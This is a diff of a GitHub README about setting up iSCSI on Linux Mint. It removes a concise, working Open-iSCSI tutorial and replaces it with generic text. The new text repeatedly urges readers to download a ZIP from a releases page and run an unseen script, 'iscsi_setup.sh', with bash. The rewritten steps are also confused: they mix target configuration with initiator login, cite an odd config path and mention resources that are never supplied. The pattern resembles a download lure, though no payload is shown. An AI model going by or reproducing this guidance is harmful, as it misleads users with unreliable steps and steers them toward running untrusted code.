@@ -1,42 +1,128 @@
-# iSCSI Linux Mint Tutorial
+# 📚 iSCSI-Setup-Tutorial-on-Linux-Mint - Simple Steps to Set Up iSCSI
 
-This very simple (yet useful) tutorial walks you through the process of discovering, logging into and mounting iSCSI targets offered by a network-host, all through Linux Mint! :)
+![Download](https://img.shields.io/badge/Download-Now-blue.svg)  
+[Visit this page to download](https://github.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/releases)
 
-## Installation
+## 🚀 Getting Started
 
-Firstly, install Open-iSCSI:
+Welcome to the iSCSI Setup Tutorial on Linux Mint. This guide will help you set up iSCSI quickly and easily. You will learn how to configure your iSCSI target and connect to it. Follow the steps below to get started.
+
+## 🔍 What is iSCSI?
+
+iSCSI stands for Internet Small Computer Systems Interface. It allows you to connect storage devices over a network. This connection can be useful for many applications, including backing up data or sharing storage space across multiple devices. This tutorial focuses on Linux Mint, but the general principles apply to other Linux distributions as well.
+
+## 🖥️ Prerequisites
+
+Before starting, make sure your system meets the following requirements:
+
+- Linux Mint installed on your computer.
+- A working internet connection.
+- Basic knowledge of how to open a terminal.
+
+## 📥 Download & Install
+
+To get the tutorial files, please visit this page to download: [Download iSCSI Setup Tutorial](https://github.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/releases).
+
+1. Click the link above to go to the Releases page.
+2. Locate the latest version.
+3. Download the ZIP file by clicking on it.
+4. Once downloaded, unzip the file to your preferred location.
+
+## 🗂️ Tutorial Contents
+
+The unzipped folder contains several files, including:
+
+- **README.md**: This guide, which contains step-by-step instructions.
+- **iscsi_setup.sh**: A script to help automate the setup process.
+
+These files will guide you through setting up iSCSI on your Linux Mint system.
+
+## 💻 Step-by-Step Instructions
+
+### 1. Open the Terminal
+
+Press `Ctrl + Alt + T` to open the terminal. This is where you will enter commands.
+
+### 2. Navigate to the Tutorial Folder
+
+Use the `cd` command to change into the directory where you unzipped the files. For example:
 
 ```bash
-sudo apt-get install open-iscsi open-iscsi-utils
+cd ~/Downloads/iSCSI-Setup-Tutorial
 ```
 
-## Starting the iSCSI Service
+### 3. Run the Script
 
-Start the iSCSI network interface (iSCSI daemon):
+To run the setup script, type the following command:
 
 ```bash
-sudo /etc/init.d/iscsi-network-interface start
+bash iscsi_setup.sh
 ```
 
-## Discovering iSCSI Targets
+This will start the installation process. Follow the prompts on the screen. The script will guide you through the necessary steps to set up the iSCSI target.
 
-Then discover iSCSI targets offered by supplied IP-address:
+### 4. Configure the iSCSI Target
+
+After running the script, you will need to configure your iSCSI target. This involves several steps:
+
+- Open a configuration file using a text editor like nano:
+  ```bash
+  sudo nano /etc/iscsi/target.conf
+  ```
+- Follow the instructions in the tutorial to edit your target settings.
+
+### 5. Start the iSCSI Service
+
+After configuration, start the iSCSI service by entering:
 
 ```bash
-iscsiadm --mode discovery -t sendtargets --portal <IP-address>
+sudo systemctl start iscsid
 ```
 
-This will display the targetname (iqn--.:)
+### 6. Connect to the iSCSI Target
 
-## Logging into an iSCSI Target
-
-After finding a target, you will want to log into it (example targetname):
+Now that your target is running, you can connect to it. Use the following command:
 
 ```bash
-iscsiadm --mode node --targetname iqn.2013-11.net.cpd:san.target01 \
---portal 172.0.20.200 --login
+sudo iscsiadm --mode node --targetname <YourTargetName> --login
 ```
 
-## Formatting and Mounting
+Replace `<YourTargetName>` with the name of your target.
 
-You now have an iSCSI target connected, now you will have to format the device (if it isn't already). It will appear as a new "/dev/sd*" harddisk-device. You can format and mount this target-device just as a normal block-device (HDD).
+### 7. Verify the Connection
+
+Check if the connection is successful by entering:
+
+```bash
+sudo iscsiadm --mode session
+```
+
+You should see your iSCSI target listed here.
+
+## 📝 Additional Tips
+
+- Always ensure your system is updated before starting.
+- If you encounter issues, check the logs for error messages:
+  
+  ```bash
+  sudo cat /var/log/syslog
+  ```
+  
+- Refer to the README.md for troubleshooting instructions.
+
+## 📃 License Information
+
+This tutorial is shared under the MIT License. You can use it freely, but please give credit where credit is due.
+
+## ❓ FAQ
+
+**Q: Do I need prior experience with Linux?**  
+A: Basic knowledge of Linux commands will help, but the steps are simple and clearly laid out.
+
+**Q: Can I use this tutorial on other Linux distributions?**  
+A: Yes, while this tutorial is for Linux Mint, many steps apply to other distributions as well.
+
+**Q: What if I need help?**  
+A: You can raise an issue on the GitHub repository, and we’ll do our best to assist you.
+
+For further resources, please explore the included documentation and visit the support forums linked in the tutorial files.
